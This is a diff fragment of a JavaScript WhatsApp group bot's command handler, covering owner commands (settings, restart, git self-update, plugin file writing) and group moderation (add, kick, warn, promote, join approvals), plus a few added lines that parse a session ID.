-            const _removedList = _removed.map(n => `  • ${n}`).join('\n')
-            return reply(`╔══════════════════════════╗\n║  🤖 *ANTIBOT SCAN DONE*\n╚══════════════════════════╝\n\n  ├ 🔍 *Scanned* › ${_members.length} members\n  ├ 🚫 *Removed* › ${_removed.length} bot(s)\n\n${_removedList}`)
-
-        } catch(e) {
-            return reply(`❌ Scan failed: ${e.message}`)
-        }
-    }
-}
-break
-
-case 'botsettings':
-case 'settings':
-case 'botconfig': {
-    await X.sendMessage(m.chat, { react: { text: '⚙️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-const on = '✅ ON'
-const off = '❌ OFF'
-let settingsText = `╔══════════════════════════╗
-║  ⚙️  *BOT SETTINGS*
-╚══════════════════════════╝
-
-  ├ 📛 *Name*     › ${global.botname}
-  ├ 🏷️  *Version*  › v${global.botver}
-  ├ 🔤 *Prefix*   › ${global.botPrefix || 'Multi-prefix'}
-  ├ 🌍 *Timezone* › ${global.botTimezone}
-  ├ 🔒 *Mode*     › ${X.public ? 'Public' : 'Private'}
-  └ 🔗 *URL*      › ${global.botUrl || global.wagc}
-
-  ├ 📦 *Pack*   › ${global.packname}
-  └ ✍️  *Author* › ${global.author}
-
-┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
-  🤖 *Auto Features*
-  ├ 👁️  Auto Read    › ${global.autoRead ? on : off}
-  ├ 📝 Auto Bio     › ${global.autoBio ? on : off}
-  ├ 💬 ChatBot      › ${global.chatBot ? on : off}
-  ├ 👀 View Status  › ${global.autoViewStatus ? on : off}
-  ├ ❤️  Like Status  › ${global.autoLikeStatus ? on : off} ${global.autoLikeEmoji ? '(' + global.autoLikeEmoji + ')' : ''}
-  ├ 💌 Reply Status › ${global.autoReplyStatus ? on : off}
-  ├ 📤 Fwd Status   › ${global.statusToGroup ? on + ' → ' + global.statusToGroup.split('@')[0] : off}
-  └ 👻 Presence     › ${global.fakePresence}
-
-  🛡️  *Protection*
-  ├ 📵 Anti-Call          › ${global.antiCall ? on : off}
-  ├ 🔗 Anti-Link          › ${global.antiLink ? on : off}
-  ├ 🗑️  Anti-Delete        › ${global.antiDelete ? on : off}
-  └ 📢 Anti Status Mention › ${global.antiStatusMention ? on : off}
-
-  👥 *Group*
-  ├ 👋 Welcome     › ${global.welcome ? on : off}
-  └ 📣 Admin Events › ${global.adminevent ? on : off}
-
-_⚡ Powered by ${global.ownername || 'Toosii Tech'}_`
-reply(settingsText)
-}
-break
-
-case 'restart':
-case 'reboot': {
-    await X.sendMessage(m.chat, { react: { text: '🔄', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-await reply(`🔄 *Restarting Bot...*\n\n⏳ _Bot will be back online shortly._\n\n_Powered by ${global.botname}_`)
-await sleep(2000)
-process.exit(0)
-} break
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Update Command — fully functional with step-by-step feedback
-case 'update': {
-    await X.sendMessage(m.chat, { react: { text: '⬆️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-const repoUrl = global.repoUrl || ''
-if (!repoUrl) return reply(`❌ *No repo URL set!*\n\nAdd this to *setting.js*:\n\`global.repoUrl = "https://github.com/TOOSII102/TOOSII-XD-ULTRA"\``)
-
-// Helper: run a shell command and return { ok, stdout, stderr }
-const run = (cmd, cwd) => new Promise(resolve => {
-    exec(cmd, { cwd: cwd || __dirname, timeout: 60000 }, (err, stdout, stderr) => {
-        resolve({ ok: !err, stdout: (stdout || '').trim(), stderr: (stderr || '').trim(), err })
-    })
-})
-
-await reply(`╔══════════════════════════╗
-║  🔃 *CHECKING FOR UPDATES*
-╚══════════════════════════╝
-
-  └ 📦 ${repoUrl}`)
-
-try {
-    // ── Step 1: Ensure git repo ───────────────────────────────────────
-    const gitCheck = await run('git rev-parse --is-inside-work-tree')
-    if (!gitCheck.ok) {
-        await run('git init')
-        await run(`git remote add origin ${repoUrl}`)
-        const fetchInit = await run('git fetch origin')
-        if (!fetchInit.ok) return reply(`❌ *Cannot reach GitHub.*\n_Check internet & repo visibility._`)
-        let initBranch = 'main'
-        const tryMain = await run('git reset --hard origin/main')
-        if (!tryMain.ok) {
-            const tryMaster = await run('git reset --hard origin/master')
-            if (!tryMaster.ok) return reply(`❌ Could not find main or master branch.`)
-            initBranch = 'master'
-        }
-        await run('npm install --production')
-        await reply(`╔══════════════════════════╗\n║  ✅ *BOT INITIALIZED*\n╚══════════════════════════╝\n\n  ├ 🌿 *Branch* › ${initBranch}\n  └ 🔄 Restarting now...`)
-        await sleep(3000)
-        return process.exit(0)
-    }
-
-    // ── Step 2: Point remote ──────────────────────────────────────────
-    await run(`git remote set-url origin ${repoUrl} 2>/dev/null || git remote add origin ${repoUrl}`)
-
-    // ── Step 3: Fetch ─────────────────────────────────────────────────
-    const fetchResult = await run('git fetch origin')
-    if (!fetchResult.ok) return reply(`❌ *Fetch failed.*\n_Check internet connection._`)
-
-    // ── Step 4: Detect branch ─────────────────────────────────────────
-    let branchRes = await run('git rev-parse --abbrev-ref HEAD')
-    let branch = branchRes.stdout && branchRes.stdout !== 'HEAD' ? branchRes.stdout : 'main'
-    const remoteBranchCheck = await run(`git ls-remote --heads origin ${branch}`)
-    if (!remoteBranchCheck.stdout) branch = branch === 'main' ? 'master' : 'main'
-
-    // ── Step 5: Compare commits ───────────────────────────────────────
-    const localCommit  = await run('git rev-parse HEAD')
-    const remoteCommit = await run(`git rev-parse origin/${branch}`)
-    const localHash  = localCommit.stdout.slice(0, 7)
-
-    if (localCommit.stdout && remoteCommit.stdout && localCommit.stdout === remoteCommit.stdout) {
-        const lastLog = await run('git log -1 --format="%s | %cr" HEAD')
-        return reply(`╔══════════════════════════╗\n║  ✅ *ALREADY UP TO DATE*\n╚══════════════════════════╝\n\n  ├ 🌿 *Branch* › ${branch}\n  ├ 🔖 *Commit* › ${localHash}\n  └ 📝 ${lastLog.stdout || 'N/A'}`)
-    }
-
-    // ── Step 6: Get changelog ─────────────────────────────────────────
-    const changelog = await run(`git log HEAD..origin/${branch} --oneline --no-merges`)
-    const changeLines = changelog.stdout ? changelog.stdout.split('\n').slice(0, 10).join('\n') : 'New changes available'
-    const changeCount = changelog.stdout ? changelog.stdout.split('\n').filter(Boolean).length : '?'
-
-    // ── Step 7: Pull ──────────────────────────────────────────────────
-    await run('git stash')
-    const pullResult = await run(`git pull origin ${branch} --force`)
-    if (!pullResult.ok) {
-        const resetResult = await run(`git reset --hard origin/${branch}`)
-        if (!resetResult.ok) return reply(`❌ *Update failed.*\n\`\`\`${(pullResult.stderr || resetResult.stderr).slice(0, 300)}\`\`\``)
-    }
-
-    // ── Step 8: Install deps ──────────────────────────────────────────
-    await run('npm install --production')
-
-    // ── Step 9: Done ──────────────────────────────────────────────────
-    const newCommit = await run('git rev-parse HEAD')
-    const newHash = newCommit.stdout.slice(0, 7)
-    await reply(`╔══════════════════════════╗
-║  ✅ *BOT UPDATED*
-╚══════════════════════════╝
-
-  ├ 🌿 *Branch*  › ${branch}
-  ├ 🔖 *Commits* › \`${localHash}\` → \`${newHash}\`
-  ├ 📋 *Changes* › ${changeCount} commit(s)
-  │  \`\`\`${changeLines.slice(0, 300)}\`\`\`
-  └ 🔄 Restarting now...`)
-    await sleep(3000)
-    process.exit(0)
-
-} catch (e) {
-    reply(`❌ *Update error:*\n\`\`\`${(e.message || e).slice(0, 300)}\`\`\``)
-}
-} break
-
-case 'addplugin': case 'addplug':{
-if (!isOwner) return  reply(mess.OnlyOwner)
-if (!q.includes("|")) return reply(`${command}, *Example :* \n\n*${prefix + command} name|category|content*`)
-const [
-pluginName,
-category, ...pluginContent
-] = q.split("|")
-const pluginDirPath = path.join(path.resolve(__dirname, './plugin', category))
-const pluginFilePath = path.join(pluginDirPath, pluginName + ".js")
-if (!q.includes("|") || pluginContent.length === 0 || fs.existsSync(pluginFilePath)) return
-if (!fs.existsSync(pluginDirPath)) fs.mkdirSync(pluginDirPath, {
-recursive: true
-})
-fs.writeFileSync(pluginFilePath, pluginContent.join('|'))
-await reply(`✅ Plugin created at *${pluginFilePath}*`)
-}
-break
-case 'cgplugin': case 'cgplug':{
-if (!isOwner) return  reply(mess.OnlyOwner)
-if (!q.includes("|")) return reply (`${command}, *Example :* *${prefix + command} pluginnya|isi barunya*`)
-let [mypler, ...rest] = q.split("|")
-let mypenis = rest.join("|")
-let pluginsDirect = path.resolve(__dirname, './plugin')
-let plugins = loadPlugins(pluginsDirect)
-for (const plugin of plugins) {
-if (plugin.command.includes(mypler)) {
-let filePath = plugin.filePath
-fs.writeFileSync(filePath, mypenis)
-await reply(`✅ Plugin replaced at *${filePath}*`)
-return
-}
-}
-await reply(`Plugin with command '${mypler}' not found`)
-}
-break
-case 'rmplugin': case 'rmplug':{
-if (!isOwner) return  reply(mess.OnlyOwner)
-if (!q) return reply(`*Example :* \n\n*${prefix + command} nama plugin*`)
-let pluginsDirect = path.resolve(__dirname, './plugin')
-let plugins = loadPlugins(pluginsDirect)
-for (const plugin of plugins) {
-if (plugin.command.includes(q)) {
-let filePath = plugin.filePath
-fs.unlinkSync(filePath)
-await reply(`✅ Plugin removed: *${filePath}*`)
-return
-}
-}
-await reply(`Plugin with command '${q}' not found.`)
-}
-break
-case 'getplugin': case 'getplug':{
-if (!isOwner) return  reply(mess.OnlyOwner)
-if (!q) return reply(`*Example :* \n\n*${prefix + command} nama plugin`) 
-let pluginsDirect = path.resolve(__dirname, './plugin')
-let plugin = loadPlugins(pluginsDirect).find(p => p.command.includes(q))
-if (!plugin) return reply(`Plugin with command '${q}' not found.`)
-await X.sendMessage(m.chat, {
-document: fs.readFileSync(plugin.filePath),
-fileName: path.basename(plugin.filePath),
-mimetype: '*/*'
-}, {
-quoted: m
-})
-await reply(`✅ Plugin *${q}* retrieved and submitted.`)
-}
-break
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Group Features
-
-            case 'welcome':
-            case 'greet':
-            case 'left':{
-               if (!m.isGroup) return reply(mess.OnlyGrup)
-               if (!isAdmins && !isOwner) return reply(mess.admin)
-               let welArg = (args[0] || '').toLowerCase()
-               if (!welArg) {
-                  let welState = global.welcome ? '✅ ON' : '❌ OFF'
-                  reply(`╔══════════════════════════╗\n║  👋 *WELCOME / GOODBYE*\n╚══════════════════════════╝\n\n  ├ 📊 *Status* › ${welState}\n  └ Sends greetings when members join/leave\n\n  ├ ${prefix}welcome on  — Enable\n  └ ${prefix}welcome off — Disable`)
-               } else if (welArg === 'on' || welArg === 'enable') {
-                  global.welcome = true
-                  reply(`╔══════════════════════════╗\n║  👋 *WELCOME / GOODBYE*\n╚══════════════════════════╝\n\n  ✅ *Enabled in ${groupName || 'this group'}*\n  _Bot will greet joins & announce leaves._`)
-               } else if (welArg === 'off' || welArg === 'disable') {
-                  global.welcome = false
-                  reply(`╔══════════════════════════╗\n║  👋 *WELCOME / GOODBYE*\n╚══════════════════════════╝\n\n  ❌ *Disabled in ${groupName || 'this group'}*\n  _Welcome and goodbye messages turned off._`)
-               }
+            // Try raw JSON string (no encoding)
+            if (!parsed) {
+                try {
+                    credsData = JSON.parse(rawId)
+                    parsed = true
+                    console.log(`[ ${_bn} ] Decoded as raw JSON session`)
+                } catch {}
             }
-            break
-            case 'events':
-            case 'groupevent':
-            case 'adminevent':{
-               if (!m.isGroup) return reply(mess.OnlyGrup)
-               if (!isAdmins && !isOwner) return reply(mess.admin)
-               let evArg = (args[0] || '').toLowerCase()
-               if (!evArg) {
-                  let evState = global.adminevent ? '✅ ON' : '❌ OFF'
-                  reply(`╔══════════════════════════╗\n║  🌟 *ADMIN EVENTS*\n╚══════════════════════════╝\n\n  ├ 📊 *Status* › ${evState}\n  └ Announces admin promotions & demotions\n\n  ├ ${prefix}events on  — Enable\n  └ ${prefix}events off — Disable`)
-               } else if (evArg === 'on' || evArg === 'enable') {
-                  global.adminevent = true
-                  reply(`╔══════════════════════════╗\n║  🌟 *ADMIN EVENTS*\n╚══════════════════════════╝\n\n  ✅ *Enabled in ${groupName || 'this group'}*\n  _Admin changes will be announced._`)
-               } else if (evArg === 'off' || evArg === 'disable') {
-                  global.adminevent = false
-                  reply(`╔══════════════════════════╗\n║  🌟 *ADMIN EVENTS*\n╚══════════════════════════╝\n\n  ❌ *Disabled in ${groupName || 'this group'}*\n  _Admin event notifications turned off._`)
-               }
+
+            if (!parsed) {
+                console.log(`[ ${_bn} ] Invalid Session ID format. Must be base64 encoded or JSON.`)
+                return
             }
-            break
-            
-            
-                        case 'add': {
-    await X.sendMessage(m.chat, { react: { text: '➕', key: m.key } })
-                                if (!m.isGroup) return reply(mess.OnlyGrup);
-                                if (!isAdmins && !isOwner) return reply(mess.admin);
-                                if (!isBotAdmins) return reply(mess.botAdmin);
-                                let addTarget = null;
-                                if (m.mentionedJid && m.mentionedJid[0]) {
-                                        addTarget = m.mentionedJid[0];
-                                } else if (m.quoted) {
-                                        if (m.quoted.sender) {
-                                                addTarget = m.quoted.sender;
-                                        } else {
-                                                let vcardMatch = (m.quoted.text || JSON.stringify(m.quoted.message || '')).match(/waid=(\d+)|TEL[;:][^:]*:[\+]?(\d+)/);
-                                                if (vcardMatch) addTarget = (vcardMatch[1] || vcardMatch[2]) + '@s.whatsapp.net';
-                                        }
-                                } else if (text) {
-                                        addTarget = text.replace(/\D/g, '') + '@s.whatsapp.net';
-                                }
-                                if (!addTarget) return reply(`📌 *Usage:* ${prefix + command} @user or number\n\n_Example: ${prefix + command} 254xxxxxxxxx_`);
-                                try {
-                                        let res = await X.groupParticipantsUpdate(m.chat, [addTarget], 'add');
-                                        for (let i of res) {
-                                                if (i.status == 408) return reply('⏳ User recently left the group. Try again later.');
-                                                if (i.status == 401) return reply('🚫 Bot is blocked by this user.');
-                                                if (i.status == 409) return reply('ℹ️ User is already in the group.');
-                                                if (i.status == 500) return reply('📛 Group is full.');
-                                                if (i.status == 403) {
-                                                        let addNum = addTarget.split('@')[0]
-                                                        await X.sendMessage(m.chat, { 
-                                                                text: `🔒 @${addNum} has a private account. Sending invite to their DM...`, 
-                                                                mentions: [addTarget] 
-                                                        }, { quoted: m });
-                                                        try {
-                                                                let invv = await X.groupInviteCode(m.chat);
-                                                                await X.sendMessage(addTarget, { 
-                                                                        text: `https://chat.whatsapp.com/${invv}\n\n📨 You've been invited to join this group by an admin.`, 
-                                                                        detectLink: true 
-                                                                }).catch(() => reply('❌ Failed to send invite to their DM.'));
-                                                        } catch { reply('❌ Could not get group invite link.'); }
-                                                } else {
-                                                        let addNum = addTarget.split('@')[0];
-                                                        X.sendMessage(from, { text: `✅ *@${addNum} has been added to the group.*`, mentions: [addTarget] }, { quoted: m });
-                                                }
-                                        }
-                                } catch (e) {
-                                        let errMsg = (e?.message || '').toLowerCase();
-                                        if (errMsg.includes('not-authorized') || errMsg.includes('403')) {
-                                                reply(mess.botAdmin);
-                                        } else {
-                                                reply('❌ Failed to add user: ' + (e.message || 'Unknown error'));
-                                        }
-                                }
-                        }
-                        break;
-
-                        case 'kick':
-                        case 'remove': {
-    await X.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
-                                if (!m.isGroup) return reply(mess.OnlyGrup);
-                                if (!isOwner && !isAdmins) return reply(mess.admin);
-                                if (!isBotAdmins) return reply(mess.botAdmin);
-                                let kickTarget = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
-                                if (!kickTarget) return reply(`📌 *Usage:* ${prefix + command} @user or reply to their message`);
-                                let kickNum = kickTarget.split('@')[0]
-                                let isTargetOwner = owner.some(o => kickTarget.includes(o)) || (typeof X.areJidsSameUser === 'function' && owner.some(o => X.areJidsSameUser(kickTarget, o + '@s.whatsapp.net')))
-                                if (isTargetOwner) return reply('🛡️ Cannot remove the bot owner.');
-                                try {
-                                        await X.groupParticipantsUpdate(m.chat, [kickTarget], 'remove');
-                                        X.sendMessage(from, { text: `🚪 *@${kickNum} has been removed from the group.*`, mentions: [kickTarget] }, { quoted: m })
-                                } catch (err) {
-                                        let errMsg = (err?.message || '').toLowerCase();
-                                        if (errMsg.includes('not-authorized') || errMsg.includes('403')) {
-                                                reply(mess.botAdmin);
-                                        } else {
-                                                reply('❌ Failed to remove user: ' + (err.message || 'Unknown error'));
-                                        }
-                                }
-                        }
-                        break;
-
-                        case 'del':
-                        case 'delete': {
-    await X.sendMessage(m.chat, { react: { text: '🗑️', key: m.key } })
-                                if (!m.quoted) return reply(`*Usage:* Reply to a message with ${prefix + command} to delete it.`);
-                                let quotedKey = m.quoted.fakeObj ? { ...m.quoted.fakeObj.key } : { remoteJid: m.quoted.chat || m.chat, fromMe: m.quoted.fromMe || false, id: m.quoted.id }
-                                if (m.isGroup && !quotedKey.participant) {
-                                        quotedKey.participant = m.quoted.sender
-                                }
-                                if (m.isGroup && !quotedKey.fromMe && !isBotAdmins) return reply('⚠️ *Bot Not Admin* — Please promote me to group admin to delete messages.');
-                                try {
-                                        if (quotedKey.fromMe || isOwner || (m.isGroup && isAdmins)) {
-                                                await X.sendMessage(m.chat, { delete: quotedKey });
-                                        } else {
-                                                reply('🚫 You can only delete bot messages or your own messages (admin required in groups).');
-                                        }
-                                } catch (err) {
-                                        let errMsg = (err?.message || '').toLowerCase()
-                                        if (errMsg.includes('not-authorized') || errMsg.includes('403')) reply('⚠️ *Bot Not Admin* — Please promote me to group admin to delete messages.')
-                                        else reply('❌ Failed to delete message: ' + (err.message || 'Unknown error'));
-                                }
-                        }
-                        break;
-
-                        case 'warn': {
-    await X.sendMessage(m.chat, { react: { text: '⚠️', key: m.key } })
-                                if (!m.isGroup) return reply(mess.OnlyGrup);
-                                if (!isOwner && !isAdmins) return reply(mess.admin);
-                                if (!isBotAdmins) return reply(mess.botAdmin);
-                                let warnUser = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
-                                if (!warnUser) return reply(`📌 *Usage:* ${prefix}warn @user [reason]\n_Reply to a message or mention someone._`);
-                                let isWarnOwner = owner.some(o => warnUser.includes(o)) || (typeof X.areJidsSameUser === 'function' && owner.some(o => X.areJidsSameUser(warnUser, o + '@s.whatsapp.net')))
-                                if (isWarnOwner) return reply('🛡️ Cannot warn the bot owner.');
-                                let warnReason = args.slice(m.mentionedJid && m.mentionedJid[0] ? 1 : 0).join(' ') || 'No reason given';
-                                let warnDbPath = path.join(__dirname, 'database', 'warnings.json');
-                                let warnDb = {};
-                                try { warnDb = JSON.parse(fs.readFileSync(warnDbPath, 'utf-8')); } catch { warnDb = {}; }
-                                let groupWarn = warnDb[m.chat] || {};
-                                let userWarns = groupWarn[warnUser] || [];
-                                userWarns.push({ reason: warnReason, time: new Date().toISOString(), by: sender });
-                                groupWarn[warnUser] = userWarns;
-                                warnDb[m.chat] = groupWarn;
-                                fs.writeFileSync(warnDbPath, JSON.stringify(warnDb, null, 2));
-                                let warnCount = userWarns.length;
-                                let maxWarns = 3;
-                                let warnNum = warnUser.split('@')[0];
-                                if (warnCount >= maxWarns) {
-                                    try {
-                                        await X.groupParticipantsUpdate(m.chat, [warnUser], 'remove');
-                                        groupWarn[warnUser] = [];
-                                        warnDb[m.chat] = groupWarn;
-                                        fs.writeFileSync(warnDbPath, JSON.stringify(warnDb, null, 2));
-                                        X.sendMessage(from, { text: `🚨 *@${warnNum} has reached ${maxWarns}/${maxWarns} warnings and has been removed!*\n\n📝 Reason: ${warnReason}`, mentions: [warnUser] }, { quoted: m });
-                                    } catch(err) {
-                                        let errMsg = (err?.message || '').toLowerCase();
-                                        if (errMsg.includes('not-authorized') || errMsg.includes('403')) {
-                                            reply(mess.botAdmin);
-                                        } else { reply(mess.error); }
-                                    }
-                                } else {
-                                    X.sendMessage(from, { text: `⚠️ *Warning ${warnCount}/${maxWarns} for @${warnNum}*\n📝 Reason: ${warnReason}\n\n_${maxWarns - warnCount} more warning(s) before removal._`, mentions: [warnUser] }, { quoted: m });
-                                }
-                        }
-                        break;
-
-                        case 'unwarn':
-                        case 'resetwarn': {
-    await X.sendMessage(m.chat, { react: { text: '🔄', key: m.key } })
-                                if (!m.isGroup) return reply(mess.OnlyGrup);
-                                if (!isOwner && !isAdmins) return reply(mess.admin);
-                                let uwUser = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
-                                if (!uwUser) return reply(`📌 *Usage:* ${prefix}unwarn @user\n_Reply to a message or mention someone._`);
-                                let uwDbPath = path.join(__dirname, 'database', 'warnings.json');
-                                let uwDb = {};
-                                try { uwDb = JSON.parse(fs.readFileSync(uwDbPath, 'utf-8')); } catch { uwDb = {}; }
-                                if (uwDb[m.chat] && uwDb[m.chat][uwUser]) {
-                                    uwDb[m.chat][uwUser] = [];
-                                    fs.writeFileSync(uwDbPath, JSON.stringify(uwDb, null, 2));
-                                    let uwNum = uwUser.split('@')[0];
-                                    X.sendMessage(from, { text: `✅ *Warnings cleared for @${uwNum}.*`, mentions: [uwUser] }, { quoted: m });
-                                } else {
-                                    reply('ℹ️ This user has no warnings.');
-                                }
-                        }
-                        break;
-
-                        case 'warnlist':
-                        case 'warnings': {
-    await X.sendMessage(m.chat, { react: { text: '⚠️', key: m.key } })
-                                if (!m.isGroup) return reply(mess.OnlyGrup);
-                                if (!isOwner && !isAdmins) return reply(mess.admin);
-                                let wlDbPath = path.join(__dirname, 'database', 'warnings.json');
-                                let wlDb = {};
-                                try { wlDb = JSON.parse(fs.readFileSync(wlDbPath, 'utf-8')); } catch { wlDb = {}; }
-                                let groupWarns = wlDb[m.chat] || {};
-                                let warnEntries = Object.entries(groupWarns).filter(([, w]) => w.length > 0);
-                                if (warnEntries.length === 0) return reply('ℹ️ No warnings in this group.');
-                                let warnListText = `╔══════════════════════════╗\n║  ⚠️  *GROUP WARNINGS*\n╚══════════════════════════╝\n\n`;
-                                let warnMentions = [];
-                                for (let [jid, warns] of warnEntries) {
-                                    let num = jid.split('@')[0];
-                                    warnMentions.push(jid);
-                                    warnListText += `│ 👤 @${num} — *${warns.length}/3*\n`;
-                                    warns.forEach((w, i) => {
-                                        warnListText += `│   ${i + 1}. ${w.reason} _(${new Date(w.time).toLocaleDateString()})_\n`;
-                                    });
-                                    warnListText += `│\n`;
-                                }
-                                warnListText += `╰━━━━━━━━━━━━━━━━━╯`
-                                X.sendMessage(from, { text: warnListText, mentions: warnMentions }, { quoted: m });
-                        }
-                        break;
-
-                        case 'promote': {
-    await X.sendMessage(m.chat, { react: { text: '⬆️', key: m.key } })
-                                if (!m.isGroup) return reply(mess.OnlyGrup)
-                                if (!isOwner && !isAdmins) return reply(mess.admin)
-                                if (!isBotAdmins) return reply(mess.botAdmin)
-                                let promoteTarget = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null
-                                if (!promoteTarget) return reply(`📌 *Usage:* ${prefix + command} @user or reply to their message`)
-                                try {
-                                    await X.groupParticipantsUpdate(m.chat, [promoteTarget], 'promote')
-                                    let promoteNum = promoteTarget.split('@')[0]
-                                    X.sendMessage(from, { text: `⬆️ *@${promoteNum} has been promoted to admin!*`, mentions: [promoteTarget] }, { quoted: m })
-                                } catch(err) {
-                                    let errMsg = (err?.message || err || '').toString().toLowerCase()
-                                    if (errMsg.includes('not-authorized') || errMsg.includes('403') || errMsg.includes('admin')) {
-                                        reply(mess.botAdmin)
-                                    } else {
-                                        reply(mess.error)
-                                    }
-                                }
-                        }
-                        break
-
-                        case 'demote': {
-    await X.sendMessage(m.chat, { react: { text: '⬇️', key: m.key } })
-                                if (!m.isGroup) return reply(mess.OnlyGrup)
-                                if (!isOwner && !isAdmins) return reply(mess.admin)
-                                if (!isBotAdmins) return reply(mess.botAdmin)
-                                let demoteTarget = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null
-                                if (!demoteTarget) return reply(`📌 *Usage:* ${prefix + command} @user or reply to their message`)
-                                let demoteNum = demoteTarget.split('@')[0]
-                                let isDemoteOwner = owner.some(o => demoteTarget.includes(o)) || (typeof X.areJidsSameUser === 'function' && owner.some(o => X.areJidsSameUser(demoteTarget, o + '@s.whatsapp.net')))
-                                if (isDemoteOwner) return reply('🛡️ Cannot demote the bot owner.')
-                                try {
-                                    await X.groupParticipantsUpdate(m.chat, [demoteTarget], 'demote')
-                                    X.sendMessage(from, { text: `⬇️ *@${demoteNum} has been demoted from admin.*`, mentions: [demoteTarget] }, { quoted: m })
-                                } catch(err) {
-                                    let errMsg = (err?.message || err || '').toString().toLowerCase()
-                                    if (errMsg.includes('not-authorized') || errMsg.includes('403') || errMsg.includes('admin')) {
-                                        reply(mess.botAdmin)
-                                    } else {
-                                        reply(mess.error)
-                                    }
-                                }
-                        }
-                        break
-
-                        case 'revoke':{
-                                if (!m.isGroup) return reply(mess.OnlyGrup);
-                                if (!isAdmins && !isOwner) return reply(mess.admin);
-                                if (!isBotAdmins) return reply(mess.botAdmin);
-                                try {
-                                    await X.groupRevokeInvite(m.chat)
-                                    reply(`╔══════════════════════════╗\n║  🚫 *LINK REVOKED*\n╚══════════════════════════╝\n\n  ✅ Invite link successfully revoked.\n  _Use ${prefix}link to generate a new one._`)
-                                } catch(err) {
-                                    let errMsg = (err?.message || '').toLowerCase()
-                                    if (errMsg.includes('not-authorized') || errMsg.includes('403')) reply(mess.botAdmin)
-                                    else reply(`❌ *Failed to revoke group link.*\n_${err.message || 'Unknown error'}_`)
-                                }
-                                }
-                                break
-
-                        case 'approve':
-                        case 'acceptjoin': {
-    await X.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
-                                if (!m.isGroup) return reply(mess.OnlyGrup)
-                                if (!isAdmins && !isOwner) return reply(mess.admin)
-                                if (!isBotAdmins) return reply(mess.botAdmin)
-                                try {
-                                        let pending = await X.groupRequestParticipantsList(m.chat)
-                                        if (!pending || pending.length === 0) return reply('ℹ️ No pending join requests.')
-                                        if (text && text.toLowerCase() === 'all') {
-                                                let jids = pending.map(p => p.jid)
-                                                await X.groupRequestParticipantsUpdate(m.chat, jids, 'approve')
-                                                reply(`✅ *Approved all ${jids.length} pending join request(s).*`)
-                                        } else if (text) {
-                                                let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-                                                let found = pending.find(p => p.jid === target)
-                                                if (!found) return reply(`❌ That number is not in the pending requests.\n\n📋 Pending: ${pending.map(p => p.jid.split('@')[0]).join(', ')}`)
-                                                await X.groupRequestParticipantsUpdate(m.chat, [target], 'approve')
-                                                reply(`✅ *Approved @${target.split('@')[0]}*`)
-                                        } else {
-                                                let list = pending.map((p, i) => `│ ${i + 1}. ${p.jid.split('@')[0]}`).join('\n')
-                                                reply(`╔══════════════════════════╗\n║  📋 *PENDING REQUESTS*\n╚══════════════════════════╝\n\n  └ *Total:* ${pending.length}\n\n${list}\n\n  ├ ${prefix}approve all / [number]\n  └ ${prefix}reject all / [number]`)
-                                        }
-                                } catch (err) {
-                                        let errMsg = (err?.message || '').toLowerCase()
-                                        if (errMsg.includes('not-authorized') || errMsg.includes('403')) reply(mess.botAdmin)
-                                        else reply('❌ Failed: ' + (err.message || 'Unknown error'))
-                                }
-                        }
-                        break
-
-                        case 'reject':
-                        case 'rejectjoin': {
-    await X.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
-                                if (!m.isGroup) return reply(mess.OnlyGrup)
-                                if (!isAdmins && !isOwner) return reply(mess.admin)
-                                if (!isBotAdmins) return reply(mess.botAdmin)
-                                try {
-                                        let pending = await X.groupRequestParticipantsList(m.chat)
-                                        if (!pending || pending.length === 0) return reply('ℹ️ No pending join requests.')
-                                        if (text && text.toLowerCase() === 'all') {
-                                                let jids = pending.map(p => p.jid)
-                                                await X.groupRequestParticipantsUpdate(m.chat, jids, 'reject')
-                                                reply(`✅ *Rejected all ${jids.length} pending join request(s).*`)
-                                        } else if (text) {
-                                                let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-                                                let found = pending.find(p => p.jid === target)
-                                                if (!found) return reply(`❌ That number is not in the pending requests.`)
-                                                await X.groupRequestParticipantsUpdate(m.chat, [target], 'reject')
-                                                reply(`✅ *Rejected @${target.split('@')[0]}*`)
-                                        } else {
-                                                let list = pending.map((p, i) => `${i + 1}. ${p.jid.split('@')[0]}`).join('\n')
-                                                reply(`📋 *Pending Join Requests (${pending.length}):*\n\n${list}\n\n📌 Use ${prefix}reject all or ${prefix}reject [number]`)
-                                        }
-                                } catch (err) {
-                                        let errMsg = (err?.message || '').toLowerCase()
-                                        if (errMsg.includes('not-authorized') || errMsg.includes('403')) reply(mess.botAdmin)
-                                        else reply('❌ Failed: ' + (err.message || 'Unknown error'))
-                                }
-                        }
-                        break
-                                
-//━━━━━━━━━━━━━━━━━━━━━━━━//                            
-// search features
-                        case 'wikimedia': {
-    await X.sendMessage(m.chat, { react: { text: '📖', key: m.key } })
-                                if (!text) return reply(`*Example :*\n\n${prefix + command} Query`);
-                                try {
-                                        const results = await wikimedia(text);
-                                        if (results.length === 0) return reply(`⚠️ No images found on Wikimedia for "${text}".`);
-                                        let result = results.map(img => `🖼️ *${img.title || 'No Title'}*\n🔗 ${img.source}`).join('\n\n');
-                                        reply(`╔══════════════════════════╗\n║  🌐 *WIKIMEDIA*\n╚══════════════════════════╝\n\n  🔍 *${text}*\n\n${result}`);
-                                } catch (err) {
